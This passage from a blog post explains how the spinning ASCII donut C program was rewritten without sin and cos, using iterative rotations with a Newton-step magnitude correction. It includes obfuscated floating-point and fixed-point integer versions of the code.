<code>cos</code> – both because it necessitates linking the math library (<code>-lm</code>), but
also because it makes it much more CPU-intensive than it really needs to be.
This is especially apparent if you try to port it to an <a href="https://twitter.com/chainq/status/1297178062937825280">older
CPU</a> or an <a href="https://twitter.com/enjoy_digital/status/1341095343816118272">embedded
device</a>.</p>

<p>So, here’s a revised version with no use of <code>sin</code>, <code>cos</code>, and no need for
linking the math library (though this version still does use <code>float</code> types).</p>

<div><div><pre><code>             i,j,k,x,y,o,N;
         main(){float z[1760],a
      #define R(t,x,y) f=x;x-=t*y\
   ;y+=t*f;f=(3-x*x-y*y)/2;x*=f;y*=f;
   =0,e=1,c=1,d=0,f,g,h,G,H,A,t,D;char
 b[1760];for(;;){memset(b,32,1760);g=0,
h=1;memset(z,0,7040);for(j=0;j&lt;90;j++){
G=0,H=1;for(i=0;i&lt;314;i++){A=h+2,D=1/(G*
A*a+g*e+5);t=G*A        *e-g*a;x=40+30*D
*(H*A*d-t*c);y=          12+15*D*(H*A*c+
t*d);o=x+80*y;N          =8*((g*a-G*h*e)
*d-G*h*a-g*e-H*h        *c);if(22&gt;y&amp;&amp;y&gt;
 0&amp;&amp;x&gt;0&amp;&amp;80&gt;x&amp;&amp;D&gt;z[o]){z[o]=D;b[o]=(N&gt;0
  ?N:0)[".,-~:;=!*#$@"];}R(.02,H,G);}R(
  .07,h,g);}for(k=0;1761&gt;k;k++)putchar
   (k%80?b[k]:10);R(.04,e,a);R(.02,d,
     c);usleep(15000);printf('\n'+(
        " donut.c! \x1b[23A"));}}
          /*no math lib needed
             .@a1k0n 2021.*/
</code></pre></div></div>

<p>It’s a little misshapen and still has comments at the bottom. I used the first
frame of its output as a template and there’s <em>slightly</em> less code than filled
pixels – oh well. Output is pretty much the same as before:</p>


<pre id="d"></pre>



<p>So, how do we get sines and cosines without using <code>sin</code> and <code>cos</code>? Well, the
code doesn’t really <em>need</em> sine and cosine <em>per se</em>; what it actually does is
rotate a point around the origin in two nested loops, and also rotate two
angles just for the animation. If you’ll recall from the other article, the
inner loop is just plotting dots in a circle, which goes around another, larger
circle. In each loop, the sine/cosine terms are just moving by a small, fixed
angle.</p>

<p>So we don’t need to track the <em>angle</em> at all, we only need to start at cos=1,
sin=0 and rotate a circle around the origin to generate all the sines and
cosines we need. We just have to repeatedly apply a fixed rotation matrix:</p>

\[\begin{bmatrix}
c' \\
s'
\end{bmatrix} = \begin{bmatrix}
\cos \theta &amp; -\sin \theta \\
\sin \theta &amp; \cos \theta
\end{bmatrix} \begin{bmatrix} c \\ s \end{bmatrix}\]

<p>So for example, if we were to use an angle of .02 radians in our inner loop, it would look something like:</p>
<div><div><pre><code><span>float</span> <span>c</span><span>=</span><span>1</span><span>,</span> <span>s</span><span>=</span><span>0</span><span>;</span>  <span>// c for cos, s for sin</span>
<span>for</span> <span>(</span><span>int</span> <span>i</span> <span>=</span> <span>0</span><span>;</span> <span>i</span> <span>&lt;</span> <span>314</span><span>;</span> <span>i</span><span>++</span><span>)</span> <span>{</span>  <span>// 314 * .02 ~= 2π</span>
  <span>// (use c, s in code)</span>
  <span>float</span> <span>newc</span> <span>=</span> <span>0</span><span>.</span><span>9998</span><span>*</span><span>c</span> <span>-</span> <span>0</span><span>.</span><span>01</span><span>9998666</span><span>*</span><span>s</span><span>;</span>
  <span>s</span> <span>=</span> <span>0</span><span>.</span><span>01</span><span>9998666</span><span>*</span><span>c</span> <span>+</span> <span>0</span><span>.</span><span>9998</span><span>*</span><span>s</span><span>;</span>
  <span>c</span> <span>=</span> <span>newc</span><span>;</span>
<span>}</span>
</code></pre></div></div>



<p>That works, but there’s a problem: no matter how precisely we define our
constants, after repeated iteration of this procedure, the magnitude of our \(\left(c, s\right)\) vector will exponentially grow or shrink over time. If we
only need to make one pass around the loop, maybe we can get away with that,
but if we have to make several (for the rotating animation, we do), we need to
fix that.</p>

<p><img src="https://www.a1k0n.net/img/sincos-mag.png" alt="sine and cosine magnitude creep"><br>
<em>an exaggerated illustration of what happens when repeatedly doing low-precision rotations</em></p>

<p>The simplest way to do that would be to multiply \(c\) and \(s\) by \(1/\sqrt{c^2 + s^2}\), but then we’re back to using the math library again. Instead, we can take
advantage of the fact that our magnitude starts out very close to 1, and we’re
going to be iterating this procedure: we can do a <a href="https://en.wikipedia.org/wiki/Newton%27s_method">Newton
step</a> after each rotation, and
that will be enough to keep the magnitude “close enough” to 1 over time.</p>

<p>Our goal is to find the reciprocal square root (<a href="https://en.wikipedia.org/wiki/Fast_inverse_square_root">sound
familiar?</a>) of \(a =
c^2 + s^2\), our \(\left(c, s\right)\) vector magnitude.  Say we define a
function \(f(x) = \frac{1}{x^2} - a\). The function is 0 when \(x =
\frac{1}{\sqrt{a}}\). We can start with an initial guess of 1 for <em>x</em>,
perform a Newton iteration to obtain <em>x’</em>, which will be “closer to”
\(\frac{1}{\sqrt{a}}\), the correct value to scale <em>c</em> and <em>s</em> by so that their
magnitude \(c^2 + s^2\) is “close to” 1 again.</p>

<p>A Newton step is defined as \(x' = x - \frac{f(x)}{f'(x)}\). I used
<a href="https://www.sympy.org/">SymPy</a> to do the derivative and simplification and
came up with \(x' = \frac{x\left(3 - a x^2\right)}{2}\). Since we’re only doing
one step, we can plug in our initial guess of 1 for \(x\) and back-substitute
\(c^2 + s^2\) for \(a\) to finally get our adjustment: \(x' = (3 - c^2 - s^2)/2\).</p>



<p>But now that we don’t have to worry so much about the magnitude of our result
(within limits), we can take another shortcut (I got this idea studying old
<a href="https://en.wikipedia.org/wiki/CORDIC">CORDIC</a> algorithms).  If we divide out
the cosines from our original rotation matrix, we get</p>

\[\begin{bmatrix}
c' \\
s'
\end{bmatrix} = \frac{1}{\cos \theta}\begin{bmatrix}
1 &amp; -\tan \theta \\
\tan \theta &amp; 1
\end{bmatrix} \begin{bmatrix} c \\ s \end{bmatrix}\]

<p>using the trig identity \(\tan \theta = \frac{\sin \theta}{\cos \theta}\).
Since we’re only dealing with small angles, the leading \(\frac{1}{\cos
\theta}\) term is close enough to 1 that we can ignore it and have our Newton
step take care of it.</p>

<p>And now we can finally understand how the rotation is done in the code. Towards
the top of the donut code is this #define, which I’ve reindented:</p>

<div><div><pre><code><span>#define R(t,x,y) \ 
</span>  <span>f</span> <span>=</span> <span>x</span><span>;</span> \
  <span>x</span> <span>-=</span> <span>t</span><span>*</span><span>y</span><span>;</span> \
  <span>y</span> <span>+=</span> <span>t</span><span>*</span><span>f</span><span>;</span> \
  <span>f</span> <span>=</span> <span>(</span><span>3</span><span>-</span><span>x</span><span>*</span><span>x</span><span>-</span><span>y</span><span>*</span><span>y</span><span>)</span><span>/</span><span>2</span><span>;</span> \
  <span>x</span> <span>*=</span> <span>f</span><span>;</span> \
  <span>y</span> <span>*=</span> <span>f</span><span>;</span>
</code></pre></div></div>

<p>This does an in-place rotation of a unit vector <code>x, y</code> where <code>t</code> is \(\tan
\theta\). <code>f</code> is a temporary variable; the first three lines do the “matrix
multiplication” on <code>x, y</code>. <code>f</code> is then re-used to get the magnitude adjustment,
and then finally <code>x</code> and <code>y</code> are multiplied by <code>f</code> which moves them back onto
the unit circle.</p>

<p>With that operation in hand, I just replaced all the angles with their sines
and cosines and ran the rotation operator <code>R()</code> instead of calling <code>sin</code>/<code>cos</code>.
The code is otherwise identical.</p>



<p>We can use exactly the same ideas with integer fixed-point arithmetic, and not
use any <code>float</code> math whatsoever. I’ve redone all the math with 10-bit precision
and produced the following C code which runs well on embedded devices which can
do 32-bit multiplications and have ~4k of available RAM:</p>

<div><div><pre><code><span>#include &lt;stdint.h&gt;
#include &lt;stdio.h&gt;
#include &lt;string.h&gt;
#include &lt;unistd.h&gt;
</span>
<span>#define R(mul,shift,x,y) \
  _=x; \
  x -= mul*y&gt;&gt;shift; \
  y += mul*_&gt;&gt;shift; \
  _ = 3145728-x*x-y*y&gt;&gt;11; \
  x = x*_&gt;&gt;10; \
  y = y*_&gt;&gt;10;
</span>
<span>int8_t</span> <span>b</span><span>[</span><span>1760</span><span>],</span> <span>z</span><span>[</span><span>1760</span><span>];</span>

<span>void</span> <span>main</span><span>()</span> <span>{</span>
  <span>int</span> <span>sA</span><span>=</span><span>1024</span><span>,</span><span>cA</span><span>=</span><span>0</span><span>,</span><span>sB</span><span>=</span><span>1024</span><span>,</span><span>cB</span><span>=</span><span>0</span><span>,</span><span>_</span><span>;</span>
  <span>for</span> <span>(;;)</span> <span>{</span>
    <span>memset</span><span>(</span><span>b</span><span>,</span> <span>32</span><span>,</span> <span>1760</span><span>);</span>  <span>// text buffer</span>
    <span>memset</span><span>(</span><span>z</span><span>,</span> <span>127</span><span>,</span> <span>1760</span><span>);</span>   <span>// z buffer</span>
    <span>int</span> <span>sj</span><span>=</span><span>0</span><span>,</span> <span>cj</span><span>=</span><span>1024</span><span>;</span>
    <span>for</span> <span>(</span><span>int</span> <span>j</span> <span>=</span> <span>0</span><span>;</span> <span>j</span> <span>&lt;</span> <span>90</span><span>;</span> <span>j</span><span>++</span><span>)</span> <span>{</span>
      <span>int</span> <span>si</span> <span>=</span> <span>0</span><span>,</span> <span>ci</span> <span>=</span> <span>1024</span><span>;</span>  <span>// sine and cosine of angle i</span>
      <span>for</span> <span>(</span><span>int</span> <span>i</span> <span>=</span> <span>0</span><span>;</span> <span>i</span> <span>&lt;</span> <span>324</span><span>;</span> <span>i</span><span>++</span><span>)</span> <span>{</span>
        <span>int</span> <span>R1</span> <span>=</span> <span>1</span><span>,</span> <span>R2</span> <span>=</span> <span>2048</span><span>,</span> <span>K2</span> <span>=</span> <span>5120</span><span>*</span><span>1024</span><span>;</span>

        <span>int</span> <span>x0</span> <span>=</span> <span>R1</span><span>*</span><span>cj</span> <span>+</span> <span>R2</span><span>,</span>
            <span>x1</span> <span>=</span> <span>ci</span><span>*</span><span>x0</span> <span>&gt;&gt;</span> <span>10</span><span>,</span>
            <span>x2</span> <span>=</span> <span>cA</span><span>*</span><span>sj</span> <span>&gt;&gt;</span> <span>10</span><span>,</span>
            <span>x3</span> <span>=</span> <span>si</span><span>*</span><span>x0</span> <span>&gt;&gt;</span> <span>10</span><span>,</span>
            <span>x4</span> <span>=</span> <span>R1</span><span>*</span><span>x2</span> <span>-</span> <span>(</span><span>sA</span><span>*</span><span>x3</span> <span>&gt;&gt;</span> <span>10</span><span>),</span>
            <span>x5</span> <span>=</span> <span>sA</span><span>*</span><span>sj</span> <span>&gt;&gt;</span> <span>10</span><span>,</span>
            <span>x6</span> <span>=</span> <span>K2</span> <span>+</span> <span>R1</span><span>*</span><span>1024</span><span>*</span><span>x5</span> <span>+</span> <span>cA</span><span>*</span><span>x3</span><span>,</span>
            <span>x7</span> <span>=</span> <span>cj</span><span>*</span><span>si</span> <span>&gt;&gt;</span> <span>10</span><span>,</span>
            <span>x</span> <span>=</span> <span>40</span> <span>+</span> <span>30</span><span>*</span><span>(</span><span>cB</span><span>*</span><span>x1</span> <span>-</span> <span>sB</span><span>*</span><span>x4</span><span>)</span><span>/</span><span>x6</span><span>,</span>
            <span>y</span> <span>=</span> <span>12</span> <span>+</span> <span>15</span><span>*</span><span>(</span><span>cB</span><span>*</span><span>x4</span> <span>+</span> <span>sB</span><span>*</span><span>x1</span><span>)</span><span>/</span><span>x6</span><span>,</span>
            <span>N</span> <span>=</span> <span>(</span><span>-</span><span>cA</span><span>*</span><span>x7</span> <span>-</span> <span>cB</span><span>*</span><span>((</span><span>-</span><span>sA</span><span>*</span><span>x7</span><span>&gt;&gt;</span><span>10</span><span>)</span> <span>+</span> <span>x2</span><span>)</span> <span>-</span> <span>ci</span><span>*</span><span>(</span><span>cj</span><span>*</span><span>sB</span> <span>&gt;&gt;</span> <span>10</span><span>)</span> <span>&gt;&gt;</span> <span>10</span><span>)</span> <span>-</span> <span>x5</span> <span>&gt;&gt;</span> <span>7</span><span>;</span>

        <span>int</span> <span>o</span> <span>=</span> <span>x</span> <span>+</span> <span>80</span> <span>*</span> <span>y</span><span>;</span>
        <span>int8_t</span> <span>zz</span> <span>=</span> <span>(</span><span>x6</span><span>-</span><span>K2</span><span>)</span><span>&gt;&gt;</span><span>15</span><span>;</span>
        <span>if</span> <span>(</span><span>22</span> <span>&gt;</span> <span>y</span> <span>&amp;&amp;</span> <span>y</span> <span>&gt;</span> <span>0</span> <span>&amp;&amp;</span> <span>x</span> <span>&gt;</span> <span>0</span> <span>&amp;&amp;</span> <span>80</span> <span>&gt;</span> <span>x</span> <span>&amp;&amp;</span> <span>zz</span> <span>&lt;</span> <span>z</span><span>[</span><span>o</span><span>])</span> <span>{</span>
          <span>z</span><span>[</span><span>o</span><span>]</span> <span>=</span> <span>zz</span><span>;</span>
          <span>b</span><span>[</span><span>o</span><span>]</span> <span>=</span> <span>".,-~:;=!*#$@"</span><span>[</span><span>N</span> <span>&gt;</span> <span>0</span> <span>?</span> <span>N</span> <span>:</span> <span>0</span><span>];</span>
        <span>}</span>
        <span>R</span><span>(</span><span>5</span><span>,</span> <span>8</span><span>,</span> <span>ci</span><span>,</span> <span>si</span><span>)</span>  <span>// rotate i</span>
      <span>}</span>
      <span>R</span><span>(</span><span>9</span><span>,</span> <span>7</span><span>,</span> <span>cj</span><span>,</span> <span>sj</span><span>)</span>  <span>// rotate j</span>
    <span>}</span>
    <span>for</span> <span>(</span><span>int</span> <span>k</span> <span>=</span> <span>0</span><span>;</span> <span>1761</span> <span>&gt;</span> <span>k</span><span>;</span> <span>k</span><span>++</span><span>)</span>
      <span>putchar</span><span>(</span><span>k</span> <span>%</span> <span>80</span> <span>?</span> <span>b</span><span>[</span><span>k</span><span>]</span> <span>:</span> <span>10</span><span>);</span>
    <span>R</span><span>(</span><span>5</span><span>,</span> <span>7</span><span>,</span> <span>cA</span><span>,</span> <span>sA</span><span>);</span>
    <span>R</span><span>(</span><span>5</span><span>,</span> <span>8</span><span>,</span> <span>cB</span><span>,</span> <span>sB</span><span>);</span>
    <span>usleep</span><span>(</span><span>15000</span><span>);</span>
    <span>printf</span><span>(</span><span>"</span><span>\x1b</span><span>[23A"</span><span>);</span>
  <span>}</span>
<span>}</span>
</code></pre></div></div>

<p>The output is pretty much the same.</p>

</article>







      </div>
    </div>
  </div></div>]]>
            </description>
            <link>https://www.a1k0n.net/2021/01/13/optimizing-donut.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25787545</guid>
            <pubDate>Fri, 15 Jan 2021 06:01:27 GMT</pubDate>
        </item>
    </channel>
</rss>
